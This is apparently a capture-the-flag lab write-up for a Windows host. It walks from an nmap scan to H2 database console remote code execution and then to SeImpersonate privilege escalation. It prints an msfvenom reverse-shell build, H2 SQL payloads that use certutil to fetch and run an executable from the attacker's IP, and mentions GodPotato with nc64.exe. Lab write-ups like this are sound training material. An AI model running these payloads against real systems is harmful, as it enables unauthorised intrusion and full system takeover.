## First eumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Tue Feb 27 17:09:48 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 80,135,139,445,5040,8082,9092 -Pn 192.168.154.66
Nmap scan report for 192.168.154.66
Host is up (0.63s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
9092/tcp open  XmlIpcRegSvc?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 37s
| smb2-time: 
|   date: 2024-02-27T16:13:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 27 17:12:58 2024 -- 1 IP address (1 host up) scanned in 189.71 seconds
```


## Enumerating port 8082

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4ed75590-f6a9-4d82-a440-4d918e1e426a)

from the nmap scan we notice a `H2 databases` service is running on port `8082`. opening it on a browser we got a login page. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/7e2fb844-45d6-4956-9e29-2a83fa846081)

clicking the connect button and was able to login

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/099986c2-6a59-47bc-83da-da0a5dc8d405)

checking online found an exploit on [exploit-db](https://www.exploit-db.com/exploits/49384). 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9aaf39f5-dd19-442e-a3c6-c2adbedec9b8)

follow the exploitation steps. and we can trigger RCE. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Jacko]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.187 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```
first generate a reverse shell payload with msf venom. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f29ea086-1cee-4e77-ad2c-bcb9d38d8d9e)

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d5ddeea1-d614-4827-8f74-3149df6ccb48)

```
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.187/reverse.exe C:\\Users\\Public\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```
upload the shell into the target. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e9500a1c-34ae-451b-b8d5-343ac58de7a0)

```shell
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\Public\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
```
trigger the shell

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ad0ae499-187a-4ec7-97e9-3c1dc0d79b8b)

Boom we got a reverse shell. 


## Privilege Escalation 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/79696594-7e0b-433f-b070-56c39059a9aa)

running whoami cmmand was not working, so we upload `whoami.exe` bin to the target. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5f087391-13ec-417b-9a9e-a2d5ed9ff07b)

checking the privs we can run, we got to see user `tony` has `SeImpersonatePrivilege` enabled, let's run printspoofer.exe. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a5d64b08-8c78-4a00-9e44-b2a9bd5af0ee)

upload prinspoofer.exe 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/cb2a1a72-4752-45c7-a599-d9548c144ac6)

printspoofer did not work, so we used `godpototato.exe`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ba7023b7-52ea-4237-b6a6-c7d1e560b532)

spawned a cmd shell... 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f94c0389-3347-45be-8f74-4291b70c3093)

cmd shell didn't work, so upload a `net.exe`. that didn't work either. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eb836595-3b9c-499d-8f6d-75ff9b0cfeb3)

Uploaded `nc64.exe` binary and we using godpotato.exe to spawn a reverse shell wih the `nc64.exe`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/705caaf4-7f13-45d7-a5bd-27987c5375c4)

And we are through with it 🙂
